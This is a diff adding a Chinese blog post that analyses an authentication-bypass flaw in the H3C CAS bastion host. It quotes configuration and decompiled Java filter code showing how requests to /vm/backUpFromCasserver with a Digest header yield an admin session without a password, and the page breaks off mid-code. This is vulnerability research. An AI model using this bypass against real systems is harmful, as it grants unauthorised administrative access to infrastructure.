@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="zn-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="简单分析学习下cas堡垒机的权限绕过漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="H3CCAS堡垒机浅析">
+<meta property="og:url" content="http://example.com/2024/06/11/H3CCAS%E5%A0%A1%E5%9E%92%E6%9C%BA%E6%B5%85%E6%9E%90/index.html">
+<meta property="og:site_name" content="Zad&#39;s blog">
+<meta property="og:description" content="简单分析学习下cas堡垒机的权限绕过漏洞">
+<meta property="og:locale" content="zn_CN">
+<meta property="og:image" content="http://example.com/2024/06/11/H3CCAS%E5%A0%A1%E5%9E%92%E6%9C%BA%E6%B5%85%E6%9E%90/image-20240705220651-x6uyp3a.png">
+<meta property="article:published_time" content="2024-06-11T01:23:09.000Z">
+<meta property="article:modified_time" content="2024-12-11T01:33:01.829Z">
+<meta property="article:author" content="zad">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/06/11/H3CCAS%E5%A0%A1%E5%9E%92%E6%9C%BA%E6%B5%85%E6%9E%90/image-20240705220651-x6uyp3a.png">
+
+<link rel="canonical" href="http://example.com/2024/06/11/H3CCAS%E5%A0%A1%E5%9E%92%E6%9C%BA%E6%B5%85%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zn-CN'
+  };
+</script>
+
+  <title>H3CCAS堡垒机浅析 | Zad's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Zad's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zn-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/11/H3CCAS%E5%A0%A1%E5%9E%92%E6%9C%BA%E6%B5%85%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="zad">
+      <meta itemprop="description" content="不忘初心,方得始终">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zad's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          H3CCAS堡垒机浅析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-06-11 09:23:09" itemprop="dateCreated datePublished" datetime="2024-06-11T09:23:09+08:00">2024-06-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-12-11 09:33:01" itemprop="dateModified" datetime="2024-12-11T09:33:01+08:00">2024-12-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h2><p>这个漏洞是微步公开的可以先看看<code>beans-security.xml</code>的配置文件，以<code>casrs</code>开头的路由需要ROLE_RSCLIENT权限，通过digestFilter进行鉴权操作，可以对应的class为<code>com.virtual.plat.server.rs.ext.event.PasswordProtectDigestAuthenticationFilter</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">http</span> <span class="attr">pattern</span>=<span class="string">&quot;/casrs/**&quot;</span> <span class="attr">entry-point-ref</span>=<span class="string">&quot;digestEntryPoint&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">intercept-url</span> <span class="attr">pattern</span>=<span class="string">&quot;/**&quot;</span> <span class="attr">access</span>=<span class="string">&quot;hasRole(&#x27;ROLE_RSCLIENT&#x27;)&quot;</span> <span class="attr">requires-channel</span>=<span class="string">&quot;any&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">custom-filter</span> <span class="attr">ref</span>=<span class="string">&quot;digestFilter&quot;</span> <span class="attr">position</span>=<span class="string">&quot;BASIC_AUTH_FILTER&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">csrf</span> <span class="attr">disabled</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">http</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans:bean</span> <span class="attr">id</span>=<span class="string">&quot;digestFilter&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">class</span>=<span class="string">&quot;com.virtual.plat.server.rs.ext.event.PasswordProtectDigestAuthenticationFilter&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">beans:property</span> <span class="attr">name</span>=<span class="string">&quot;userDetailsService&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;casUserDetailsService&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">beans:property</span> <span class="attr">name</span>=<span class="string">&quot;authenticationEntryPoint&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;digestEntryPoint&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">beans:property</span> <span class="attr">name</span>=<span class="string">&quot;userCache&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;casAuthUserCache&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans:bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>跟入对应的filter代码中，<code>PasswordProtectDigestAuthenticationFilter</code>继承了<code>DigestAuthenticationFilterExt</code>，如果路由是<code>/vm/backUpFromCasserver</code>，var4设置为true，进入父类的dofilter方法</p>
+<pre><code>public void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3) throws IOException, ServletException &#123;
+    GenericHttpRequest var6 = new GenericHttpRequest((HttpServletRequest)var1);
+    if (this.a(var6, var2)) &#123;
+        boolean var4 = false;
+        String var5 = ((HttpServletRequest)var6).getPathInfo();
+        if (&quot;/vm/backUpFromCasserver&quot;.equals(var5)) &#123;
+            var4 = true;
+        &#125;
+
+        super.doFilter(var6, var2, var3, var4);
+        if (SecurityContextHolder.getContext().getAuthentication() == null) &#123;
+            HttpServletRequest var7;
+            String var8;
+            if ((var8 = (var7 = (HttpServletRequest)var6).getHeader(&quot;Authorization&quot;)) != null &amp;&amp; var8.startsWith(&quot;Digest &quot;)) &#123;
+                this.a(var6);
+            &#125;
+
+            return;
+        &#125;
+
+        this.b(var6);
+    &#125;
+
+&#125;
+</code></pre>
+<p>在父类的doFilter方法中，需要获取Authorization的值以Digest 开头，跟入this.a方法</p>
+<pre><code>public void doFilter(ServletRequest var1, ServletResponse var2, FilterChain var3, boolean var4) throws IOException, ServletException &#123;
+    HttpServletRequest var6 = (HttpServletRequest)var1;
+    HttpServletResponse var7 = (HttpServletResponse)var2;
+    String var5;
+    if ((var5 = var6.getHeader(&quot;Authorization&quot;)) == null || !var5.startsWith(&quot;Digest &quot;) || this.a(var6, var7, var5, var4)) &#123;
+        if (var5 == null || !var5.startsWith(&quot;LDAP &quot;) || this.b(var6, var7, var5)) &#123;
+            LoginParameter var8;
+            if ((var8 = LocalParameter.get()) == null) &#123;
+                (var8 = new LoginParameter()).setIgnorePw(var4);
+                LocalParameter.put(var8);
+            &#125; else &#123;
+                var8.setIgnorePw(var4);
+            &#125;
+
+            var3.doFilter(var6, var7);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>在a方法中，if语句中判断，AuthorCenterService的isAuthorCenter方法默认是返回false</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">a</span><span class="params">(HttpServletRequest var1, HttpServletResponse var2, String var3, <span class="type">boolean</span> var4)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">      <span class="keyword">if</span> (AuthorCenterService.isAuthorCenter()) &#123;</span><br><span class="line">          Map var15;</span><br><span class="line">          <span class="keyword">if</span> ((var15 = a(a(var3.substring(<span class="number">7</span>), <span class="string">&#x27;,&#x27;</span>), <span class="string">&quot;=&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>)) == <span class="literal">null</span>) &#123;</span><br><span class="line">              a.error(<span class="string">&quot;handleAuthAC Error: headerMap is null.&quot;</span>);</span><br><span class="line">		............</span><br><span class="line">		............</span><br><span class="line">		............</span><br><span class="line">                  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="built_in">this</span>.b(var1, var2, var3, var4);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isAuthorCenter</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">AuthorCenterService</span> <span class="variable">gInstance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">return</span> gInstance == <span class="literal">null</span> ? <span class="literal">false</span> : gInstance.useAuthorCenter();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么久跟入this.b方法中，获取几个关键值 username realm nonce uri qop nc cnonce，最后在<code>var23 = new UsernamePasswordAuthenticationToken(var26, var26.getPassword());</code>方法中调用springsecurity中的UsernamePasswordAuthenticationToken方法进行赋权操作，var26这里就是传入的username 即admin，而密码是通过springsecurity中UserDetailsService.loadUserByUsername(var26)方法来检索出用户admin的用户名、密码、权限，所以这里根本不需要输入密码，就可以得到一个admin的cookie</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">b</span><span class="params">(HttpServletRequest var1, HttpServletResponse var2, String var3, <span class="type">boolean</span> var4)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    Map var5;</span><br><span class="line">    <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)(var5 = a(a(var3 = var3.substring(<span class="number">7</span>), <span class="string">&#x27;,&#x27;</span>), <span class="string">&quot;=&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>)).get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">var7</span> <span class="operator">=</span> (String)var5.get(<span class="string">&quot;realm&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">var8</span> <span class="operator">=</span> (String)var5.get(<span class="string">&quot;nonce&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">var9</span> <span class="operator">=</span> (String)var5.get(<span class="string">&quot;uri&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">var10</span> <span class="operator">=</span> (String)var5.get(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">var11</span> <span class="operator">=</span> (String)var5.get(<span class="string">&quot;qop&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">var12</span> <span class="operator">=</span> (String)var5.get(<span class="string">&quot;nc&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">var25</span> <span class="operator">=</span> (String)var5.get(<span class="string">&quot;cnonce&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (var6 != <span class="literal">null</span> &amp;&amp; var7 != <span class="literal">null</span> &amp;&amp; var8 != <span class="literal">null</span> &amp;&amp; var9 != <span class="literal">null</span> &amp;&amp; var2 != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;auth&quot;</span>.equals(var11) || var12 != <span class="literal">null</span> &amp;&amp; var25 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!var7.equals(<span class="built_in">this</span>.getAuthenticationEntryPoint().getRealmName())) &#123;</span><br><span class="line">                <span class="built_in">this</span>.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(<span class="keyword">new</span> <span class="title class_">BadCredentialsException</span>(<span class="built_in">this</span>.messages.getMessage(<span class="string">&quot;DigestAuthenticationFilter.incorrectRealm&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var7, <span class="built_in">this</span>.getAuthenticationEntryPoint().getRealmName()&#125;, <span class="string">&quot;Response realm name &#x27;&#123;0&#125;&#x27; does not match system realm name of &#x27;&#123;1&#125;&#x27;&quot;</span>))));</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!Base64.isBase64(var8.getBytes())) &#123;</span><br><span class="line">                <span class="built_in">this</span>.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(<span class="keyword">new</span> <span class="title class_">BadCredentialsException</span>(<span class="built_in">this</span>.messages.getMessage(<span class="string">&quot;DigestAuthenticationFilter.nonceEncoding&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var8&#125;, <span class="string">&quot;Nonce is not encoded in Base64; received nonce &#123;0&#125;&quot;</span>))));</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String[] var13;</span><br><span class="line">                <span class="keyword">if</span> ((var13 = StringUtils.delimitedListToStringArray(var3 = <span class="keyword">new</span> <span class="title class_">String</span>(Base64.decode(var8.getBytes())), <span class="string">&quot;:&quot;</span>)).length != <span class="number">2</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(<span class="keyword">new</span> <span class="title class_">BadCredentialsException</span>(<span class="built_in">this</span>.messages.getMessage(<span class="string">&quot;DigestAuthenticationFilter.nonceNotTwoTokens&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var3&#125;, <span class="string">&quot;Nonce should have yielded two tokens but was &#123;0&#125;&quot;</span>))));</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">long</span> var18;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        var18 = <span class="keyword">new</span> <span class="title class_">Long</span>(var13[<span class="number">0</span>]);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (NumberFormatException var22) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(<span class="keyword">new</span> <span class="title class_">BadCredentialsException</span>(<span class="built_in">this</span>.messages.getMessage(<span class="string">&quot;DigestAuthenticationFilter.nonceNotNumeric&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var3&#125;, <span class="string">&quot;Nonce token should have yielded a numeric first token, but was &#123;0&#125;&quot;</span>))));</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!a(var18 + <span class="string">&quot;:&quot;</span> + <span class="built_in">this</span>.getAuthenticationEntryPoint().getKey()).equals(var13[<span class="number">1</span>])) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(<span class="keyword">new</span> <span class="title class_">BadCredentialsException</span>(<span class="built_in">this</span>.messages.getMessage(<span class="string">&quot;DigestAuthenticationFilter.nonceCompromised&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var3&#125;, <span class="string">&quot;Nonce token compromised &#123;0&#125;&quot;</span>))));</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">var24</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">                        UserDetails var26;</span><br><span class="line">                        <span class="keyword">if</span> ((var26 = <span class="built_in">this</span>.e.getUserFromCache(var6)) == <span class="literal">null</span>) &#123;</span><br><span class="line">                            var24 = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                var26 = <span class="built_in">this</span>.f.loadUserByUsername(var6);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (UsernameNotFoundException var21) &#123;</span><br><span class="line">                                <span class="built_in">this</span>.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(<span class="keyword">new</span> <span class="title class_">BadCredentialsException</span>(<span class="built_in">this</span>.messages.getMessage(<span class="string">&quot;DigestAuthenticationFilter.usernameNotFound&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var6&#125;, <span class="string">&quot;Username &#123;0&#125; not found&quot;</span>))));</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (var26 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AuthenticationServiceException</span>(<span class="string">&quot;AuthenticationDao returned null, which is an interface contract violation&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="built_in">this</span>.e.putUserInCache(var26);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        String var14;</span><br><span class="line">                        <span class="keyword">if</span> (!(var14 = a(<span class="built_in">this</span>.g, var6, var7, var26.getPassword(), var1.getMethod(), var9, var11, var8, var12, var25)).equals(var10) &amp;&amp; !var24 &amp;&amp; !var4) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (a.isDebugEnabled()) &#123;</span><br><span class="line">                                a.debug(<span class="string">&quot;Digest comparison failure; trying to refresh user from DAO in case password had changed&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                var26 = <span class="built_in">this</span>.f.loadUserByUsername(var6);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (UsernameNotFoundException var20) &#123;</span><br><span class="line">                                <span class="built_in">this</span>.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(<span class="keyword">new</span> <span class="title class_">BadCredentialsException</span>(<span class="built_in">this</span>.messages.getMessage(<span class="string">&quot;DigestAuthenticationFilter.usernameNotFound&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;var6&#125;, <span class="string">&quot;Username &#123;0&#125; not found&quot;</span>))));</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="built_in">this</span>.e.putUserInCache(var26);</span><br><span class="line">                            var14 = a(<span class="built_in">this</span>.g, var6, var7, var26.getPassword(), var1.getMethod(), var9, var11, var8, var12, var25);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (!var14.equals(var10) &amp;&amp; !var4) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (a.isDebugEnabled()) &#123;</span><br><span class="line">                                a.debug(<span class="string">&quot;Expected response: &#x27;&quot;</span> + var14 + <span class="string">&quot;&#x27; but received: &#x27;&quot;</span> + var10 + <span class="string">&quot;&#x27;; is AuthenticationDao returning clear text passwords?&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="built_in">this</span>.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(<span class="keyword">new</span> <span class="title class_">BadCredentialsException</span>(<span class="built_in">this</span>.messages.getMessage(<span class="string">&quot;DigestAuthenticationFilter.incorrectResponse&quot;</span>, <span class="string">&quot;Incorrect response&quot;</span>))));</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var18 &lt; System.currentTimeMillis()) &#123;</span><br><span class="line">                            <span class="built_in">this</span>.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(<span class="keyword">new</span> <span class="title class_">NonceExpiredException</span>(<span class="built_in">this</span>.messages.getMessage(<span class="string">&quot;DigestAuthenticationFilter.nonceExpired&quot;</span>, <span class="string">&quot;Nonce has expired/timed out&quot;</span>))));</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (a.isDebugEnabled()) &#123;</span><br><span class="line">                                a.debug(<span class="string">&quot;Authentication success for user: &#x27;&quot;</span> + var6 + <span class="string">&quot;&#x27; with response: &#x27;&quot;</span> + var10 + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            UsernamePasswordAuthenticationToken var23;</span><br><span class="line">                            <span class="keyword">if</span> (<span class="built_in">this</span>.h) &#123;</span><br><span class="line">                                var23 = <span class="keyword">new</span> <span class="title class_">UsernamePasswordAuthenticationToken</span>(var26, var26.getPassword(), var26.getAuthorities());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                var23 = <span class="keyword">new</span> <span class="title class_">UsernamePasswordAuthenticationToken</span>(var26, var26.getPassword());</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            var23.setDetails(<span class="built_in">this</span>.c.buildDetails(var1));</span><br><span class="line">                            SecurityContextHolder.getContext().setAuthentication(var23);</span><br><span class="line">                            <span class="keyword">if</span> (var1.getSession() != <span class="literal">null</span>) &#123;</span><br><span class="line">                                var1.getSession().setAttribute(<span class="string">&quot;loginName&quot;</span>, var6);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (a.isDebugEnabled()) &#123;</span><br><span class="line">                a.debug(<span class="string">&quot;extracted nc: &#x27;&quot;</span> + var12 + <span class="string">&quot;&#x27;; cnonce: &#x27;&quot;</span> + var25 + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span 